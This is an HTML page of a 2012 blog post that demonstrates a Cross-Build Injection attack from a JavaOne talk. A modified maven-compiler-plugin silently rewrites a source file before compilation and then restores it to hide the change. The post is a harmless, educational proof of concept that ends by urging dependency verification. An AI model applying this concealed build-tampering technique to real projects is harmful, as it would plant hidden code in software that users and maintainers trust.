@@ -1,0 +1,332 @@
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Cross-Build Injection in action - Branch and Bound</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="Sander Mak">
+
+    <link href="http://feeds.feedburner.com/BranchAndBound" rel="alternate" title="Branch and Bound Blog Feed" type="application/atom+xml" />
+    <!-- Le styles -->
+    <link href="/assets/themes/sander/bootstrap/css/bootstrap.css" rel="stylesheet">
+    <link href="/assets/themes/sander/bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
+    <link href="/assets/themes/sander/syntax.css" rel="stylesheet">
+    <link href="/assets/themes/sander/style.css" rel="stylesheet">
+
+    <style type="text/css">
+      body {
+        padding-top: 10px;
+        padding-bottom: 40px;
+      }
+    </style>
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le fav and touch icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/bootstrap/ico/apple-touch-icon-144-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/bootstrap/ico/apple-touch-icon-114-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/bootstrap/ico/apple-touch-icon-72-precomposed.png">
+    <link rel="apple-touch-icon-precomposed" href="assets/bootstrap/ico/apple-touch-icon-57-precomposed.png">
+
+  </head>
+
+  <body>
+
+
+    <div class="container">
+      <div class="row">
+        <div class="span11">
+    <div class="navbar">
+      <div class="navbar-inner">
+        <div class="container">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="/">Branch and Bound</a>
+          <div class="nav-collapse">
+            <ul class="nav">
+              <li><a href="/">Home</a></li>
+              <li><a href="/about.html">About</a></li>
+              <li><a href="/talks.html">Talks</a></li>
+              <li><a href="/archive.html">Archive</a></li>
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+        </div>
+      </div>
+      <div class="row">
+        <div class="span6 offset2">
+          
+<article>
+  <header>
+    <h1>Cross-Build Injection in action</h1>
+    <strong><time datetime="2012-10-08" pubdate>08 October 2012</time></strong>
+
+    <br>
+    <br>
+
+    <p><em><p>A <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build">previous post</a> introduced Cross-Build Injection (XBI) attacks. Recently, I've had the opportunity to present this work at JavaOne. In that session, I used a live example to show what could go wrong. By popular request, this post outlines the example XBI attack that I used as demonstration.</p>
+</em></p>
+  </header>
+  
+
+  <section>
+   <p>The setup consists of a trivial Maven project called 'hacked' (<a href="/dl/xbi_code.zip">download here</a>) with a single class that prints the exciting message "Hi there"... or does it? Along the way, we'll introduce a nefarious version of the maven-compiler-plugin which mixes things up a bit!</p>
+
+<h3>Hello world under attack</h3>
+
+<p>So how do we get this innocent snippet of Java:</p>
+
+<div class="highlight"><pre><code class="java"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+
+  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Hi there&quot;</span><span class="o">);</span>
+  <span class="o">}</span> 
+
+<span class="o">}</span>
+</code></pre></div>
+
+
+<p>to print "Hi, you've been p0wned" rather than the bland "Hi there" message using a Cross-Build Injection attack? The central premise of my <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build">Cross-Build Injection Attacks</a> talk is that this depends on how secure your build setup is. Let's take a look at a typical Maven-based setup. When we do a "mvn clean install" on the project containing the Test class, the following happens:</p>
+
+<p><img src="/pics/xbi_setup.png" alt="Maven and XBI" /></p>
+
+<p>Maven downloads both the dependencies of your application (none in this case) and the plugins (including any dependencies) it needs for its own functioning. We defined version 2.5.1 of the maven-compiler-plugin in the pom.xml, so it is retrieved from Maven Central over a regular http connection. Of course this is prone to all kinds foul play, as discussed in the <a href="/blog/security/2012/03/crossbuild-injection-how-safe-is-your-build">original article</a>.</p>
+
+<h3>Use the source</h3>
+
+<p>Rather than creating a network setup that intercepts and replaces Maven request/responses, let's just place a compromised artifact in our local repository manually, to simulate the effects of an XBI attack. Since the maven-compiler-plugin orchestrates the actual invocation of the Java compiler, it seems like a good place to subvert the build process. Fortunately the source is just an <a href="http://svn.apache.org/repos/asf/maven/plugins/tags/maven-compiler-plugin-2.5.1">svn checkout</a> away. A little digging finds us the AbstractCompilerMojo class, containing an execute() method which ultimately invokes the compiler. So let's get to it and change it to our liking:</p>
+
+<div class="highlight"><pre><code class="java"><span class="kd">public</span> <span class="kd">abstract</span> <span class="kd">class</span> <span class="nc">AbstractCompilerMojo</span> <span class="kd">extends</span> <span class="n">AbstractMojo</span> <span class="o">{</span>
+
+  <span class="c1">// ... snipped lots of code ...</span>
+
+  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">execute</span><span class="o">()</span> 
+    <span class="kd">throws</span> <span class="n">MojoExecutionException</span><span class="o">,</span> <span class="n">CompilationFailureException</span> <span class="o">{</span>
+    
+    <span class="n">File</span> <span class="n">src</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">basedir</span> <span class="o">+</span> <span class="s">&quot;/src/main/java/Test.java&quot;</span><span class="o">);</span>
+    <span class="n">String</span> <span class="n">original</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">original</span> <span class="o">=</span> <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileRead</span><span class="o">(</span><span class="n">src</span><span class="o">);</span>
+        <span class="n">String</span> <span class="n">replaced</span> <span class="o">=</span> <span class="n">original</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot; there&quot;</span><span class="o">,</span> <span class="s">&quot;, you been p0wned!&quot;</span><span class="o">);</span>
+        <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileWrite</span><span class="o">(</span><span class="n">src</span><span class="o">,</span> <span class="n">replaced</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+    <span class="o">}</span>
+
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="c1">// original body of execute() here, calling the </span>
+        <span class="c1">// compiler with the replaced source...</span>
+    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">FileUtils</span><span class="o">.</span><span class="na">fileWrite</span><span class="o">(</span><span class="n">src</span><span class="o">,</span> <span class="n">original</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="nf">RuntimeException</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">}</span> 
+
+<span class="o">}</span>
+</code></pre></div>
+
+
+<p>(For the lazy bunch, here's the code (including the modified maven-compiler-plugin) in a convenient <a href="/dl/xbi_code.zip">download</a>.)</p>
+
+<p>The first try-block reads the original source, stores it for later use and overwrites the original source with our replaced code. When the actual Java compiler later on reads the source, it sees our modified version. Of course, this is horribly hardcoded towards our example, but you can make this as smart as you want (discover and parse all sources, transform them conditionally et cetera). Then, the last try-block calls the original code of execute(). Since the original code has many return points, we use the finally-block to ensure we always write back the original source to Test.java. Nobody will see what just happened to the source being compiled...</p>
+
+<p>To bring our version of the maven-compiler-plugin in place, execute</p>
+
+<div class="highlight"><pre><code class="sh">:maven-compiler-plugin<span class="nv">$ </span>mvn clean install -DskipTests
+</code></pre></div>
+
+
+<p>in the maven-compiler-plugin project that we just 'improved'. The skipTests flag is necessary since our 'improvement' obviously fails any sensible unit test in the compiler plugin. Now this nefarious version of the compiler plugin lives in your local repository.</p>
+
+<h3>Compile and behold</h3>
+
+<p>Just two more steps to see our 'improved' compiler plugin in action. Perform a mvn clean install on the 'hacked' project, and run it:</p>
+
+<div class="highlight"><pre><code class="sh">:hacked<span class="nv">$ </span>mvn clean install
+.. snipped ..
+<span class="o">[</span>INFO<span class="o">]</span> --- maven-compiler-plugin:2.5.1:compile <span class="o">(</span>default-compile<span class="o">)</span> @ hacked ---
+<span class="o">[</span>INFO<span class="o">]</span> Compiling 1 <span class="nb">source </span>file to .../hacked/target/classes
+.. snipped ..
+<span class="o">[</span>INFO<span class="o">]</span> -------------------------------------------------------------------
+<span class="o">[</span>INFO<span class="o">]</span> BUILD SUCCESS
+<span class="o">[</span>INFO<span class="o">]</span> -------------------------------------------------------------------
+.. snipped ..
+
+:hacked<span class="nv">$ </span>java -cp ./target/classes Test
+Hi, you<span class="err">&#39;</span>ve been p0wned!
+</code></pre></div>
+
+
+<p>There you have it: when compiled using this maven-compiler-plugin implementation, our original class seems to be untouched but the resulting .class file will print the unexpected message. And remember, we use a plain and uncompromised install of both Maven and the Java compiler. However, because Maven downloads a plugin before compiling, arbitrary code may be executed if you are not careful!</p>
+
+<h3>Exploiting XBI</h3>
+
+<p>Now of course this example would be easily caught by your friendly QA department. But think about it. What could really happen if arbitrary code were injected into your build process, or into your application? How about a backdoor? Or, if a hacker is really smart... Replace an up-to-date library with a previous version containing a known vulnerability, while pretending it is the current version. As you can see, there's plenty of options. Here's some <a href="http://www.koch.ro/blog/index.php?url=archives/153-On-distributing-binaries.html">more inspiration</a> if you're still not convinced. So make sure <a href="/blog/security/2012/08/verify-dependencies-using-pgp/">you verify</a> what you put into your build system and application. Trust is in short supply. Use it sparingly.</p>
+
+<p>For some more context, here are the slides of the talk I gave at JavaOne on Cross-Build Injection attacks:</p>
+
+<iframe src="http://www.slideshare.net/slideshow/embed_code/14579226" width="425" height="355" frameborder="0" marginwidth="0" marginheight="0" scrolling="no">embed</iframe>
+
+
+<p>Have fun, and remember: build safely!</p>
+
+  </section>
+</article>
+<div>
+  <strong>If you liked this post, please share it!</strong>
+  <a href="https://twitter.com/share" class="twitter-share-button" data-url="http://branchandbound.net/blog/security/2012/10/cross-build-injection-in-action" data-via="Sander_Mak" data-dnt="true">Tweet</a>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</div>
+
+<br>
+<br>
+
+<div id="related">
+  <h3>Related Posts</h3>
+  <ul class="posts">
+    
+      <li><span>05 Aug 2013</span> &raquo; <a href="/blog/web/2013/08/some-angularjs-pitfalls">Some AngularJS pitfalls</a></li>
+    
+      <li><span>18 Jul 2013</span> &raquo; <a href="/blog/java/2013/07/java-modularity-story">The Java Modularity Story</a></li>
+    
+      <li><span>24 Jun 2013</span> &raquo; <a href="/blog/development/2013/06/annoyances-daily-life-developer">Annoyances in the daily life of a developer</a></li>
+    
+  </ul>
+</div>
+
+
+
+
+  <div id="disqus_thread"></div>
+<script type="text/javascript">
+    
+    var disqus_shortname = 'branchandbound'; // required: replace example with your forum shortname
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = 'http://' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">blog comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+
+
+
+
+        </div>
+        <div class="span3">
+         <div class="hero-unit sidebar">
+           <a href="http://feeds.feedburner.com/BranchAndBound"><img class="rss pull-right" title="Branch and Bound Blog RSS Feed" alt="RSS Feed" src="/assets/themes/sander/rss.png"></a>
+           <h4 class="sidebar"><strong>Branch and Bound Blog</strong></h4>
+           <em>... pruning the software universe</em> 
+           <hr>
+           <ul class="sidebar unstyled">
+             <li><a href="/about.html">About Sander</a></li>
+           </ul>
+           <span class="sidebar pull-right">
+             <a href="http://www.twitter.com/Sander_Mak" target="_blank"><img title="Twitter" alt="Twitter" class="small" src="/assets/themes/sander/twitter.png"></a>
+             <a href="http://nl.linkedin.com/in/SanderMak" target="_blank"><img title="Linkedin profile" alt="Linkedin profile" class="small" src="/assets/themes/sander/linkedin.png"><a>
+             <a href="http://www.github.com/SanderMak" target="_blank"><img  title="GitHub" alt="GitHub" class="small" src="/assets/themes/sander/github.png"></a>
+             <a href="http://www.slideshare.net/SanderMak/presentations" target="_blank"><img title="Slideshare presentations"  alt="Slideshare presentations" class="small" src="/assets/themes/sander/slideshare.png"></a>
+           </span>
+           <hr>
+           <h5 class="sidebar">&nbsp;View archive by:</h5>
+           <ul class="sidebar unstyled">
+             <li><a href="/archive.html">Date</a></li>
+             <li><a href="/categories.html">Category</a></li>
+             <li><a href="/tags.html">Tag</a></li>
+           </ul>
+          </div>
+          <div class="hero-unit twittersidebar">
+            <h5 class="sidebar">Featured articles:</h5>
+            <br>
+            <ul>
+              <li>&raquo; <a href="/blog/scala/2013/05/launching-scalabitz/?src=featured">Launching Scalabitz</a></li>
+              <li>&raquo; <a href="/blog/bookreview/2013/01/bookreview-infinity-and-the-mind/?src=featured">Infinity and the Mind</a></li>      
+  	          <li>&raquo; <a href="/blog/conferences/2012/06/preparing-a-technical-talk/?src=featured">Preparing a technical talk</a></li>
+            </ul>
+          </div>
+          <div class="hero-unit readingsidebar">
+            <h5 class="sidebar">Currently reading:</h5>
+            <br>
+            <ul>
+              <li>&raquo; <a href="http://www.amazon.com/gp/product/1933988916/ref=as_li_ss_tl?ie=UTF8&tag=branandboun-20&linkCode=as2&camp=1789&creative=390957&creativeASIN=1933988916" target="_blank">OSGi in action</a></li>
+              <li>&raquo; <a href="http://www.amazon.com/gp/product/1593273886/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=1593273886&linkCode=as2&tag=branandboun-20" target="_blank">The Tangled Web</a></li>
+              <li>&raquo; <a href="http://www.amazon.com/gp/product/0321125215/ref=as_li_ss_tl?ie=UTF8&tag=branandboun-20&linkCode=as2&camp=1789&creative=390957&creativeASIN=0321125215" target="_blank">Domain-driven design</a></li>
+            </ul>
+          </div>
+          <div class="hero-unit sidebar">
+           <a class="twitter-timeline" width="250" height="500" data-dnt=true href="https://twitter.com/Sander_Mak" data-widget-id="266609354059431938">Tweets by @Sander_Mak</a>
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+
+
+                       
+          </div>
+        </div>
+       </div>
+      </div>
+     </div>
+
+
+      <footer>
+        <div class="container">
+         <div class="row">
+           <div class="span9 offset2">
+            <br>
+            <hr>
+           </div>
+         </div>
+         <div class="row">
+          <div class="span4 offset2">
+            <p>Branch and Bound - ... pruning the software universe</p>
+          </div>   
+          <div class="span5">  
+            <p class="pull-right">by Sander Mak</p>
+          </div>
+         </div>
+        </div>
+      </footer>
+
+    <!-- Scripts at the end for faster loading. -->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript"></script>
+    <script src="/assets/themes/sander/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
+    <script type="text/javascript" src="http://twitter.com/javascripts/blogger.js"></script>
+   
+
+    <script type="text/javascript">
+
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-15335121-2']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+
+    </script>
+
+  </body>
+</html>
+
+
+
